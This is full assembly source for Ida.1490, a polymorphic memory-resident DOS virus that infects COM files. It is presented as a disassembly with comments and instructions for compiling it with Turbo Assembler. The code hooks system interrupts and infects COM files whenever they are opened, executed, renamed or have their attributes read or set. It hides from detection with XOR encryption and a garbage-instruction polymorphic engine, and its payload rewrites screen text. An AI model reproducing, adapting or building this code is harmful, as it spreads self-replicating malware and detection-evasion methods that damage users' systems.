   ; comment *
   ;               Ida.1490           ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;                Disassembly by    ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;                 Darkman/29A       ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;                                  ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;  Ida.1490 is a 1491 bytes parasitic resident COM virus. Infects files at open
   ;  file, get or set file attributes, load and execute program and rename file
   ;  by appending the virus to the infected file. Ida.1490 has an error handler,
   ;  non-destructive payload, second layer 16-bit exclusive OR (XOR) encryption
   ;  in file and is polymorphic in file using its internal polymorphic engine.
   ;  Ida.1490 is using the Random Decoding Key (RDK) technique.
   ;
   ;  I would like to thank VirusBuster for providing me the binary of this virus.
   ;
   ;  Compile Ida.1490 with Turbo Assembler v 5.0 by typing:
   ;      TASM /M IDA_1490.ASM
   ;      TLINK /t /x IDA_1490.OBJ
   ; *

   .model tiny
   .code
   .386
    org   100h              ; Origin of Ida.1490

   code_begin:
            jmp     virus_begin

            db      0c8h dup(?)
   virus_begin:
            call    delta_offset
   delta_offset:
            pop     bp          ; Load BP from stack
            sub     bp,offset delta_offset

   decrypt_key  equ     word ptr $+01h  ; Decryption key
            mov     dx,00h      ; DX = decryption key

            jmp     decryptor
   second_loop:
            xor     bx,bx       ; First loop

            jmp     decryptor
   first_loop:
            mov     bh,22h      ; Second loop
   decryptor:
            lea     si,[bp+crypt_begin] ; SI = offset of crypt_begin
            mov     cx,(crypt_end-crypt_begin)

            push    dx          ; Save DX at stack
   decrypt_loop:
            xor     [si],dx         ; Decrypt two bytes of encrypted code

            inc     si          ; Increase index register
            add     dx,'SE'             ; Add the sliding key to the decry...

            loop    decrypt_loop
            pop     dx          ; Load DX from stack

            mov     cx,(checksum_end-checks_begin)
            lea     si,[bp+crypt_begin] ; SI = offset of crypt_begin
            xor     ax,ax       ; Zero AX
            cld             ; Clear direction flag
   checksu_loop:
            lodsb           ; AL = byte of decrypted code

            add     ah,al       ; AH = checksum

            loop    checksu_loop

            cmp     ax,0e101h       ; Correct checksum?
            je      virus_begin_    ; Equal? Jump to virus_begin_

            cmp     bh,22h      ; Second loop?
            jne     first_loop      ; Not equal? Jump to first_loop

            inc     dh          ; Increase high-order byte of decr...

            jmp     second_loop
   crypt_begin:
   checks_begin:
   virus_begin_:
            mov     ax,0deadh       ; Ida.1490 function
            int     21h
            cmp     di,1996h        ; Already resident?
            je      virus_exit      ; Equal? Jump to virus_exit

            mov     bx,es       ; BX = segment of PSP for current ...
            dec     bx          ; BX = segment of current Memory C...
            mov     es,bx       ; ES =    "    "     "      "     "

            mov     byte ptr es:[00h],'Z'

            mov     ax,cs:[02h]     ; AX = segment of first byte beyon...
            sub     ax,((code_end-virus_begin)/10h)+0ah
            mov     cs:[02h],ax     ; Store segment of first byte beyo...

            mov     ax,es:[03h]     ; AX = size of memory block in par...
            sub     ax,((code_end-virus_begin)/10h)+0ah
            mov     es:[03h],ax     ; Store size of memory block in pa...

            stc             ; Set carry flag
            adc     ax,bx       ; AX = segment of the virus
            mov     es,ax       ; ES =    "    "   "    "

            push    es          ; Save ES at stack
            mov     ax,3521h        ; Get interrupt vector 21h
            int     21h
            mov     word ptr cs:[bp+int21_addr],bx
            mov     word ptr cs:[bp+int21_addr+02h],es
            pop     es

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     si,[bp+virus_begin] ; SI = offset of virus_begin
            xor     di,di       ; Zero DI
            mov     cx,(code_end-virus_begin)
            cld             ; Clear direction flag
            rep     movsb       ; Move the virus to top of memory

            mov     dx,(int21_virus-virus_begin)

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     ax,2521h        ; Set interrupt vector 21h
            int     21h

            mov     ax,351ch        ; Get interrupt vector 1ch
            int     21h
            mov     word ptr ds:[(int1c_addr-virus_begin)],bx
            mov     word ptr ds:[(int1c_addr-virus_begin+02h)],es

            mov     dx,(int1c_virus-virus_begin)
            mov     ah,25h      ; Set interrupt vector 1ch
            int     21h
   virus_exit:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     si,[bp+origin_code] ; SI = offset of origin_code
            mov     di,100h         ; DI = offset of beginning of code
            movsw           ; Move the original code to beginning
            movsb           ;  "    "     "      "   "      "

            xor     ax,ax       ; Zero AX
            xor     cx,cx       ; Zero CX
            cwd             ; Zero DX
            mov     bx,dx       ; Zero BX

            push    100h        ; Save offset of beginning of code...
            ret             ; Return!

   int21_virus  proc    near        ; Interrupt 21h of Ida.1490
            pushf           ; Save flags at stack
            push    ax bx cx dx ds es si di

            cmp     ax,4b00h        ; Load and execute program?
            je      examine_name    ; Equal? Jump to examine_name
            cmp     ah,56h      ; Rename file?
            je      examine_name    ; Equal? Jump to examine_name
            cmp     ah,3dh      ; Open file?
            je      examine_name    ; Equal? Jump to examine_name
            cmp     ah,43h      ; Get or set file attributes?
            je      examine_name    ; Equal? Jump to examine_name

            jmp     int21_exit_
   examine_name:
            clc             ; Clear carry flag
            mov     cx,80h      ; Search through hundred and twent...
            xor     al,al       ; Zero AL
            mov     di,dx       ; DI = offset of filename
   find_zero:
            cmp     al,[di]         ; Found end of filename?
            je      examine_ext     ; Equal? Jump to examine_ext

            inc     di          ; Increase index register

            loop    find_zero

            jmp     int21_exit_
   examine_ext:
            sub     di,04h      ; DI = offset of dot in filename
            mov     al,'.'
            cmp     al,[di]         ; Found dot in filename?
            je      found_dot       ; Equal? Jump to found_dot

            jmp     int21_exit_
   found_dot:
            mov     si,di       ; SI = offset of dot in filename
            sub     si,06h      ; DI = offset within filename

            mov     ax,[si]         ; AX = two bytes of the filename
            and     ax,1101111111011111b
            cmp     ax,'BI'             ; IBMBIO.COM or IBMDOS.COM?
            je      int21_exit      ; Equal? Jump to int21_exit

            inc     di          ; DI = offset within file extension
            mov     al,[di]         ; AL = byte of file extension
            and     al,11011111b    ; Upcase character
            cmp     al,'C'              ; COM executable?
            jne     int21_exit      ; Not equal? Jump to int21_exit

            inc     di          ; DI = offset within file extension
            mov     al,[di]         ; AL = byte of file extension
            and     al,11011111b    ; Upcase character
            cmp     al,'O'              ; COM executable?
            jne     int21_exit      ; Not equal? Jump to int21_exit

            inc     di          ; DI = offset within file extension
            mov     al,[di]         ; AL = byte of file extension
            and     al,11011111b    ; Upcase character
            cmp     al,'M'              ; COM executable?
            je      infect_file     ; Equal? Jump to infect_file
   int21_exit:
            jmp     int21_exit_
   infect_file:
            call    int24_store

            mov     ax,4300h        ; Get file attributes
            call    int21_simula

            xor     ch,ch       ; CH = new file attributes
            db      81h,0e1h,0feh,0ffh  ; AND CX,0FFFEh
            mov     ax,4301h        ; Set file attributes
            call    int21_simula
   checksum_end:
            mov     ax,3d02h        ; Open file (read/write)
            call    int21_simula
            jc      infect_exit     ; Error? Jump to infect_exit
            xchg    ax,bx       ; BX = file handle

            mov     ax,4200h        ; Set current file position (SOF)
            call    set_file_pos

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ah,3fh      ; Read from file
            mov     cx,03h      ; Read three bytes
            mov     dx,(origin_code-virus_begin)
            call    int21_simula

            cmp     word ptr ds:[(origin_code-virus_begin)],'ZM'
            je      close_file      ; Equal? Jump to close_file

            mov     ax,5700h        ; Get file's date and time
            call    int21_simula
            mov     ds:[(file_time-virus_begin)],cx
            mov     ds:[(file_date-virus_begin)],dx

            mov     ax,4202h        ; Set current file position (EOF)
            mov     dx,-02h         ; CX:DX = offset from origin of ne...
            mov     cx,-01h         ;   "   "   "     "     "    "    "
            call    int21_simula

            mov     ah,3fh      ; Read from file
            mov     cx,02h      ; Read two bytes
            mov     dx,(infect_mark-virus_begin)
            call    int21_simula

            mov     si,dx       ; SI = offset of infect_mark
            mov     dx,ds:[(infect_mark_-virus_begin)]
            cmp     [si],dx         ; Already infected?
            je      close_file      ; Equal? Jump to close_file

            mov     ax,4200h        ; Set current file position (SOF)
            call    set_file_pos

            mov     ax,4202h        ; Set current file position (EOF)
            call    set_file_pos

            cmp     ax,0f230h       ; Filesize too large?
            ja      close_file      ; Above? Jump to close_file
            cmp     ax,100h         ; Filesize too small?
            jb      close_file      ; Below? Jump to close_file

            mov     ds:[(filesize-virus_begin)],ax

            sub     ax,03h      ; AX = offset of virus within infe...
            mov     ds:[(infect_code-virus_begin+01h)],ax

            push    bx          ; Save BX at stack
            call    ida_poly
            pop     bx          ; Load BX from stack
            cmp     ax,0ffffh       ; Insufficient memory?
            je      close_file      ; Error? Jump to close_file

            mov     ah,40h      ; Write to file
            xor     dx,dx       ; DX = offset of decryptor
            mov     cx,ds:[(decrypt_len-virus_begin)]

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            call    int21_simula

            mov     ah,40h      ; Write to file
            mov     dx,100h         ; DX = offset of encrypted code
            mov     cx,(code_end-virus_begin)
            call    int21_simula

            mov     ah,49h      ; Free memory
            call    int21_simula

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ax,4200h        ; Set current file position (SOF)
            call    set_file_pos

            mov     ah,40h      ; Write to file
            mov     dx,(infect_code-virus_begin)
            mov     cx,03h      ; Write three bytes
            call    int21_simula

            mov     ax,5701h        ; Set file's date and time
            mov     dx,cs:[(file_date-virus_begin)]
            mov     cx,cs:[(file_time-virus_begin)]
            call    int21_simula
   close_file:
            mov     ah,3eh      ; Close file
            call    int21_simula
   infect_exit:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     dx,ds:[(int24_addr-virus_begin)]

            push    word ptr ds:[(int24_addr-virus_begin+02h)]
            pop     ds          ; Load DS from stack (high-order ...)

            mov     ax,2524h        ; Set interrupt vector 24h
            call    int21_simula
   int21_exit_:
            pop     di si es ds dx cx bx ax

            cmp     ax,0deadh       ; Ida.1490 function?
            je      ida_function    ; Equal? Jump to ida_function

            popf            ; Load flags from stack

            jmp     dword ptr cs:[(int21_addr-virus_begin)]

   int24_store  proc    near        ; Get and set interrupt vector 24h
            push    ds dx bx es     ; Save registers at stack

            mov     ax,3524h        ; Get interrupt vector 24h
            call    int21_simula

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     word ptr ds:[(int24_addr-virus_begin)],bx
            mov     word ptr ds:[(int24_addr-virus_begin+02h)],es

            mov     ah,25h      ; Get interrupt vector 24h
            mov     dx,(int24_virus-virus_begin)
            call    int21_simula

            pop     es bx dx ds     ; Load registers from stack

            ret             ; Return!
            endp

   int24_virus  proc    near        ; Interrupt 24h of Ida.1490
            mov     al,03h      ; Fail system call in progress

            iret            ; Interrupt return!
            endp
   ida_function:
            mov     di,1996h        ; Already resident

            popf            ; Load flags from stack

            iret            ; Interrupt return!
            endp

   origin_code  db      11001101b,00100000b,?
   infect_code  db      11101001b,?,?   ; JMP imm16 (opcode 0e9h)
   file_date    dw      ?           ; File date
   file_time    dw      ?           ; File time

   set_file_pos proc    near        ; Set current file position
            xor     cx,cx       ; CX:DX = offset from origin of ne...
            cwd             ;   "   "   "     "     "    "    "
            call    int21_simula

            ret             ; Return!
            endp

   int21_simula proc    near        ; Simulate interrupt 21h
            pushf           ; Save flags at stack

            db      10011010b       ; CALL imm32 (opcode 9ah)
   int21_addr   dd      ?           ; Address of interrupt 21h

            ret             ; Return!
            endp

   int1c_virus  proc    near        ; Interrupt 1Ch of Ida.1490
            push    ds es ax dx cx di si

            cmp     cs:[clock_tick],00h ; Twenty clock ticks?
            jae     exam_txt_vid    ; Above or equal? Jump to exam_txt...

            jmp     dec_clock_ti
            endp

   i_love_begin:
   i_love_veron db      'IVeronika !'      ; Text to replace with
   i_love_v_end:
   vera_begin:
   vera         db      'VERA'              ; Text to search for
   vera_end:
   clock_tick   db      ?           ; Clock tick counter
   exam_txt_vid:
            mov     byte ptr cs:[(clock_tick-virus_begin)],14h

            mov     ax,0b800h       ; AX = segment of text video RAM
            mov     es,ax       ; ES =    "    "   "     "    "
            mov     di,0fa0h        ; DI = offset of end of text video...
   search_v:
            sub     di,08h      ; DI = offset within text video RAM

            clc             ; Clear carry flag
   search_v_:
            mov     al,es:[di]      ; AL = byte within text video RAM
            and     al,11011111b    ; Upcase character
            cmp     al,'V'              ; V?
            je      found_v         ; Equal? Jump to found_v

            dec     di          ; Decrease index register
            dec     di          ; Decrease index register
            cmp     di,1388h        ; Past the end of text video RAM?
            jb      search_v_       ; Below? Jump to search_v_

            jmp     int1c_exit
   found_v:
            mov     cx,(vera_end-vera_begin)
            mov     si,(vera-virus_begin)

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            cld             ; Clear direction flag
   search_vera:
            mov     al,es:[di]      ; AL = byte within text video RAM
            and     al,11011111b    ; Upcase character

            cmp     [si],al         ; VERA?
            jne     search_v        ; Not equal? Jump to search_v

            inc     di          ; Increase index register
            inc     di          ; Increase index register

            inc     si          ; Increase index register

            loop    search_vera

            mov     cx,(i_love_v_end-i_love_begin)
            sub     di,08h      ; DI = offset within text video RAM
            mov     si,(i_love_veron-virus_begin)
   move_i__loop:
            movsb           ; Move twelve bytes within text vi...

            inc     di          ; Increase index register

            loop    move_i__loop
   dec_clock_ti:
            dec     byte ptr cs:[(clock_tick-virus_begin)]
   int1c_exit:
            pop     si di cx dx ax es ds

            db      11101010b       ; JMP imm32 (opcode 0eah)
   int1c_addr   dd      ?           ; Address of interrupt 1ch
   filesize     dw      ?           ; Low-order word of filesize
   int24_addr   dd      ?           ; Address of interrupt 24h

   comment*
                Ida.1490 (polymorphic engine)     ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
                    Disassembly by        ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
                     Darkman/29A       ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
                                  ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ

     Garbage instructions:
       INC AX; INC BX; INC CX; INC DX; INC BP; INC SI; INC DI; DEC AX; DEC BX;
       DEC CX; DEC DX; DEC BP; DEC SI; DEC DI; NOP; CLD; CBW; ES:; DS:; CS

     Count/index registers:
       BX; DI; SI

     Registers holding the decryption key:
       AX; (BX); CX; DX

     Decryptor:
       One to fourteen garbage instruction(s).
       MOV reg16,imm16      (Register holding decryption key, decryption key)
       One to fourteen garbage instruction(s).
       MOV reg16,imm16       (Count/index register, offset of encrypted code)
       One to fourteen garbage instruction(s).
       NOT [reg16]/NEG [reg16]/XOR [reg16],reg16
       One to fourteen garbage instruction(s).
       INC reg16                      (Increase count/index register)
       One to fourteen garbage instruction(s).
       CMP reg16,imm16                    (End of encrypted code)
       One to fourteen garbage instruction(s).
       JB imm8            (Garbage generation above decryption algorithm)
       One to fourteen garbage instruction(s).

     Min. decryptor size:  19 bytes.
     Max. decryptor size: 113 bytes.
   *

   ida_poly     proc    near        ; Ida.1490 (polymorphic engine)
            mov     ah,48h      ; Allocate memory
            mov     bx,(code_end-virus_begin)/10h+8ah
            call    int21_simula
            jnc     ida_poly_       ; No error? Jump to ida_poly_

            mov     ax,0ffffh       ; Insufficient memory

            ret             ; Return!
   ida_poly_:
            mov     es,ax       ; ES = segment of allocated memory
            mov     ds:[(cryptor_addr-virus_begin+02h)],ax

            mov     word ptr ds:[(mov_r16_off_-virus_begin)],00h
            mov     word ptr ds:[(mov_r16_off-virus_begin)],00h
   gen_garbage:
            call    get_rnd_num

            mov     ax,0fh      ; Random number within fifteen
            call    rnd_in_range

            or      di,di       ; Don't generate any garbage inst...?
            jz      gen_garbage     ; Zero? Jump to gen_garbage

            mov     cx,di       ; CX = number of one byte garbage ...
            xor     di,di       ; DI = offset of decryptor
   gen_garbage_:
            push    di          ; Save DI at stack
            call    get_rnd_num

            mov     ax,(one_byte_end-one_by_begin)
            call    rnd_in_range

            lea     si,[di+(one_by_table-virus_begin)]
            pop     di          ; Load DI from stack

            cld             ; Clear direction flag
            lodsb           ; INC reg16/DEC reg16/NOP/CLD/CBW/...
            stosb           ; Store INC reg16/DEC reg16/NOP/CL...

            loop    gen_garbage_

            mov     ds:[(mov_r16_off_-virus_begin)],di

            call    get_rnd_num

            mov     ax,(crypt_ta_end-crypt__begin)/07h
            call    rnd_in_range

            mov     ax,(crypt_ta_end-crypt__begin)/11h
            mul     di          ; AX = random number within twenty...

            push    es          ; Save ES at stack
            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            mov     si,(crypt_table-virus_begin)
            add     si,ax       ; SI = offset within crypt_table
            mov     ds:[(crypt_offset-virus_begin)],si

            mov     di,(crypt_algo-virus_begin)
            cld             ; Clear direction flag
            movsw           ; Move NOT [reg16]/NEG [reg16]/XOR...
            pop     es          ; Load ES from stack

            call    move_algo

            cmp     byte ptr ds:[(mov_r16_i16_-virus_begin)],00h
            je      gen_mov_reg     ; No encryption/decryption key? Ju...

            mov     di,ds:[(mov_r16_off_-virus_begin)]
            mov     si,(mov_r16_i16_-virus_begin)
            lodsb           ; MOV reg16,imm16 (Decryption key)
            stosb           ; Store MOV reg16,imm16 (Decrypti...)
            inc     di          ; Increase index register
            inc     di          ; Increase index register
            call    gen_garbag_

            add     word ptr ds:[(mov_r16_off-virus_begin)],03h
   gen_mov_reg:
            mov     di,ds:[(mov_r16_off_-virus_begin)]
            add     di,ds:[(mov_r16_off-virus_begin)]

            mov     ds:[(mov_r16_of_-virus_begin)],di
            mov     si,(mov_r16_i16-virus_begin)
            cld             ; Clear direction flag
            lodsb           ; MOV reg16,imm16 (Offset of encr...)
            stosb           ; Store MOV reg16,imm16 (Offset o...)
            inc     di          ; Increase index register
            inc     di          ; Increase index register
            call    gen_garbag_

            mov     si,(crypt_algo-virus_begin)
            cld             ; Clear direction flag
            lodsw           ; NOT [reg16]/NEG [reg16]/XOR [reg...
            stosw           ; Store NOT [reg16]/NEG [reg16]/XO...
            call    gen_garbag_

            mov     si,ds:[(crypt_offset-virus_begin)]
            add     si,05h      ; SI = offset of INC reg16 within ...
            cld             ; Clear direction flag
            lodsb           ; INC reg16
            stosb           ; Store INC reg16
            call    gen_garbag_

            mov     ds:[(cmp_r16_off-virus_begin)],di
            mov     si,(cmp_r16_i16-virus_begin)
            cld             ; Clear direction flag
            lodsw           ; CMP reg16,imm16 (End of encrypt...)
            stosw           ; Store CMP reg16,imm16 (End of e...)
            inc     di          ; Increase index register
            inc     di          ; Increase index register
            call    gen_garbag_

            mov     si,(jb_imm8-virus_begin)
            mov     ds:[(jb_imm8_off-virus_begin)],di
            cld             ; Clear direction flag
            lodsw           ; JB imm8 (Garbage generation abo...)
            stosw           ; Store JB imm8 (Garbage generati...)
            call    gen_garbag_
            mov     ds:[(decrypt_len-virus_begin)],di

            mov     di,ds:[(mov_r16_off_-virus_begin)]
            inc     di          ; DI = offset of MOV reg16,imm16  ...
            call    get_rnd_num
            clc             ; Clear carry flag
            mov     es:[di],bx      ; Store encryption/decryption key

            mov     di,ds:[(mov_r16_of_-virus_begin)]
            inc     di          ; DI = offset of MOV reg16,imm16  ...
            mov     word ptr es:[di],100h

            mov     di,ds:[(cmp_r16_off-virus_begin)]
            inc     di          ; DI = offset of CMP reg16,imm16  ...
            inc     di          ; DI =   "    "   "       "        "
            mov     word ptr es:[di],(code_end-virus_begin-03h)+100h

            mov     di,ds:[(jb_imm8_off-virus_begin)]
            inc     di          ; DI = offset of JB imm8 (Garbage...)
            mov     ax,ds:[(jb_imm8_off-virus_begin)]
            sub     ax,ds:[(mov_r16_of_-virus_begin)]
            mov     bl,01h      ; BL = 8-bit immediate
            sub     bl,al       ; BL =   "       "
            mov     es:[di],bl      ; Store 8-bit immediate

            mov     cx,(code_end-virus_begin)
            mov     si,(virus_begin-virus_begin)
            mov     di,100h         ; DI = offset of plain code
            rep     movsb       ; Move plain code within segment o...

            mov     cx,(crypt_end-crypt_begin)
            call    get_rnd_num

            push    bx          ; Save BX at stack
            mov     ax,2080h        ; Random number within thirty-two ...
            call    rnd_in_range

            xchg    ax,di       ; DI = random number within thirty...
            sub     bh,al       ; BX = decryption key
            mov     di,(crypt_begin-virus_begin+100h)
            mov     es:[(decrypt_key-virus_begin+100h)],bx
            pop     bx          ; Load BX from stack
   encrypt_loop:
            xor     es:[di],bx      ; Encrypt two bytes of plain code

            add     bx,'SE'             ; Add the sliding key to the encry...
            inc     di          ; Increase index register

            loop    encrypt_loop

            mov     di,ds:[(decrypt_len-virus_begin)]
            mov     byte ptr es:[di],11001011b


            push    ds          ; Save DS at stack
            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            pushf           ; Save flags at stack
            push    bp          ; Save BP at stack

            db      10011010b       ; CALL imm32 (opcode 9ah)
   cryptor_addr dd      00h         ; Address of encryptor/decryptor

            pop     bp          ; Load BP from stack
            popf            ; Load flags from stack

            pop     ds          ; Load DS from stack

            mov     dx,ds:[(filesize-virus_begin)]
            add     dx,ds:[(decrypt_len-virus_begin)]

            mov     di,ds:[(mov_r16_of_-virus_begin)]
            inc     di          ; DI = offset of MOV reg16,imm16  ...
            add     dx,100h         ; DX = 16-bit immediate
            mov     es:[di],dx      ; Store 16-bit immediate

            add     dx,(code_end-virus_begin)
            mov     di,ds:[(cmp_r16_off-virus_begin)]
            inc     di          ; DI = offset of CMP reg16,imm16  ...
            inc     di          ; DI =   "    "   "       "        "
            sub     dx,03h      ; DX = 16-bit immediate
            mov     es:[di],dx      ; Store 16-bit immediate

            ret             ; Return!
   one_by_begin:
   one_by_table:
            inc     ax          ; Increase AX
            inc     cx          ; Increase CX
            inc     dx          ; Increase DX
            inc     bx          ; Increase BX
            inc     bp          ; Increase BP
            inc     si          ; Increase SI
            inc     di          ; Increase DI
            dec     ax          ; Decrease AX
            dec     cx          ; Decrease CX
            dec     dx          ; Decrease DX
            dec     bx          ; Decrease BX
            dec     bp          ; Decrease BP
            dec     si          ; Decrease SI
            dec     di          ; Decrease DI
            nop
            nop
            cld             ; Clear direction flag
            cbw             ; Convert byte to word
            cld             ; Clear direction flag
            nop
            nop
            seges           ; Extra segment as source segment
            segds           ; Data segment as source segment
            inc     dx          ; Increase DX
            segcs           ; Code segment as source segment
   one_byte_end:
   crypt__begin:
   crypt_table:
            not     byte ptr [si]   ; Encrypt/decrypt byte of plain/en...
            db      11111110b       ; CMP SI,imm16 (opcode 81h,0feh)
            db      10111110b       ; MOV SI,imm16 (opcode 0beh)
            db      00h         ; No encryption/decryption key
            inc     si          ; Increase index register
            dec     si          ; Decrease index register

            not     byte ptr [di]   ; Encrypt/decrypt byte of plain/en...
            db      11111111b       ; CMP DI,imm16 (opcode 81h,0ffh)
            db      10111111b       ; MOV DI,imm16 (opcode 0bfh)
            db      00h         ; No encryption/decryption key
            inc     di          ; Increase index register
            dec     di          ; Decrease index register

            not     byte ptr [bx]   ; Encrypt/decrypt byte of plain/en...
            db      11111011b       ; CMP BX,imm16 (opcode 81h,0fbh)
            db      10111011b       ; MOV BX,imm16 (opcode 0bbh)
            db      00h         ; No encryption/decryption key
            inc     bx          ; Increase index register
            dec     bx          ; Decrease index register

            neg     byte ptr [si]   ; Encrypt/decrypt byte of plain/en...
            db      11111110b       ; CMP SI,imm16 (opcode 81h,0feh)
            db      10111110b       ; MOV SI,imm16 (opcode 0beh)
            db      00h         ; No encryption/decryption key
            inc     si          ; Increase index register
            dec     si          ; Decrease index register

            neg     byte ptr [di]   ; Encrypt/decrypt byte of plain/en...
            db      11111111b       ; CMP DI,imm16 (opcode 81h,0ffh)
            db      10111111b       ; MOV DI,imm16 (opcode 0bfh)
            db      00h         ; No encryption/decryption key
            inc     di          ; Increase index register
            dec     di          ; Decrease index register

            neg     byte ptr [bx]   ; Encrypt/decrypt byte of plain/en...
            db      11111011b       ; CMP BX,imm16 (opcode 81h,0fbh)
            db      10111011b       ; MOV BX,imm16 (opcode 0bbh)
            db      00h         ; No encryption/decryption key
            inc     bx          ; Increase index register
            dec     bx          ; Decrease index register

            xor     [si],ax         ; Encrypt/decrypt byte of plain/en...
            db      11111110b       ; CMP SI,imm16 (opcode 81h,0feh)
            db      10111110b       ; MOV SI,imm16 (opcode 0beh)
            db      10111000b       ; MOV AX,imm16 (opcode 0b8h)
            inc     si          ; Increase index register
            dec     si          ; Decrease index register

            xor     [di],ax         ; Encrypt/decrypt byte of plain/en...
            db      11111111b       ; CMP DI,imm16 (opcode 81h,0ffh)
            db      10111111b       ; MOV DI,imm16 (opcode 0bfh)
            db      10111000b       ; MOV AX,imm16 (opcode 0b8h)
            inc     di          ; Increase index register
            dec     di          ; Decrease index register

            xor     [bx],ax         ; Encrypt/decrypt byte of plain/en...
            db      11111011b       ; CMP BX,imm16 (opcode 81h,0fbh)
            db      10111011b       ; MOV BX,imm16 (opcode 0bbh)
            db      10111000b       ; MOV AX,imm16 (opcode 0b8h)
            inc     bx          ; Increase index register
            dec     bx          ; Decrease index register

            xor     [si],cx         ; Encrypt/decrypt byte of plain/en...
            db      11111110b       ; CMP SI,imm16 (opcode 81h,0feh)
            db      10111110b       ; MOV SI,imm16 (opcode 0beh)
            db      10111001b       ; MOV AX,imm16 (opcode 0b9h)
            inc     si          ; Increase index register
            dec     si          ; Decrease index register

            xor     [di],cx         ; Encrypt/decrypt byte of plain/en...
            db      11111111b       ; CMP DI,imm16 (opcode 81h,0ffh)
            db      10111111b       ; MOV DI,imm16 (opcode 0bfh)
            db      10111001b       ; MOV AX,imm16 (opcode 0b9h)
            inc     di          ; Increase index register
            dec     di          ; Decrease index register

            xor     [bx],cx         ; Encrypt/decrypt byte of plain/en...
            db      11111011b       ; CMP BX,imm16 (opcode 81h,0fbh)
            db      10111011b       ; MOV BX,imm16 (opcode 0bbh)
            db      10111001b       ; MOV AX,imm16 (opcode 0b9h)
            inc     bx          ; Increase index register
            dec     bx          ; Decrease index register

            xor     [si],dx         ; Encrypt/decrypt byte of plain/en...
            db      11111110b       ; CMP SI,imm16 (opcode 81h,0feh)
            db      10111110b       ; MOV SI,imm16 (opcode 0beh)
            db      10111010b       ; MOV AX,imm16 (opcode 0bah)
            inc     si          ; Increase index register
            dec     si          ; Decrease index register

            xor     [di],dx         ; Encrypt/decrypt byte of plain/en...
            db      11111111b       ; CMP DI,imm16 (opcode 81h,0ffh)
            db      10111111b       ; MOV DI,imm16 (opcode 0bfh)
            db      10111010b       ; MOV AX,imm16 (opcode 0bah)
            inc     di          ; Increase index register
            dec     di          ; Decrease index register

            xor     [bx],dx         ; Encrypt/decrypt byte of plain/en...
            db      11111011b       ; CMP BX,imm16 (opcode 81h,0fbh)
            db      10111011b       ; MOV BX,imm16 (opcode 0bbh)
            db      10111010b       ; MOV AX,imm16 (opcode 0bah)
            inc     bx          ; Increase index register
            dec     bx          ; Decrease index register

            xor     [si],bx         ; Encrypt/decrypt byte of plain/en...
            db      11111110b       ; CMP SI,imm16 (opcode 81h,0feh)
            db      10111110b       ; MOV SI,imm16 (opcode 0beh)
            db      10111011b       ; MOV AX,imm16 (opcode 0bbh)
            inc     si          ; Increase index register
            dec     si          ; Decrease index register

            xor     [di],bx         ; Encrypt/decrypt byte of plain/en...
            db      11111111b       ; CMP DI,imm16 (opcode 81h,0ffh)
            db      10111111b       ; MOV DI,imm16 (opcode 0bfh)
            db      10111011b       ; MOV AX,imm16 (opcode 0bbh)
            inc     di          ; Increase index register
            dec     di          ; Decrease index register
   crypt_ta_end:
   jb_imm8:
            jb      $+02h       ; Below? Jump to garbage generaton...

            db      00h
            db      '[IDA] v0.01',00h   ; Name of the engine
            db      'Serg_Enigma',00h   ; Author of the engine
   mov_r16_off  dw      ?           ; Offset of MOV reg16,imm16 (Offs...)
   mov_r16_off_ dw      ?           ; Offset of MOV reg16,imm16 (Decr...)
   mov_r16_of_  dw      ?           ; Offset of MOV reg16,imm16 (Offs...)
   cmp_r16_off  dw      ?           ; Offset of CMP reg16,imm16 (End ...)
   decrypt_len  dw      ?           ; Length of decryptor
   jb_imm8_off  dw      ?           ; Offset of JB imm8 (Garbage gene...)
   random_count db      ?           ; Random counter
   cmp_r16_i16  db      10000001b       ; CMP reg16,imm16 (opcode 81h)
   crypt_begin_:
   crypt_table_:
            db      ?           ; CMP reg16,imm16 (End of encrypt...)
   mov_r16_i16  db      ?           ; MOV reg16,imm16 (Offset of encr...)
   mov_r16_i16_ db      ?           ; MOV reg16,imm16 (Decryption key)
   inc_reg16    db      ?           ; INC reg16 (Index register)
   dec_reg16    db      ?           ; DEC reg16 (Index register)
   crypt_b_end_:
   crypt_algo   dw      ?           ; NOT [reg16]/NEG [reg16]/XOR [reg...
   random_off   dw      ?           ; Random offset
   crypt_offset dw      ?           ; Offset of encryption/decryption ...

   move_algo    proc    near        ; Move encryption/decryption algor...
            push    es          ; Save ES at stack

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            push    di si       ; Save registers at stack
            mov     si,ds:[(crypt_offset-virus_begin)]
            inc     si          ; SI = offset of CMP reg16,imm16 w...
            inc     si          ; SI =   "    "   "       "       "

            mov     di,(crypt_table_-virus_begin)
            mov     cx,(crypt_b_end_-crypt_begin_)
            rep     movsb       ; Move encryption/decryption algor...
            pop     si di       ; Load registers from stack

            pop     es          ; Load ES from stack

            ret             ; Return!
            endp

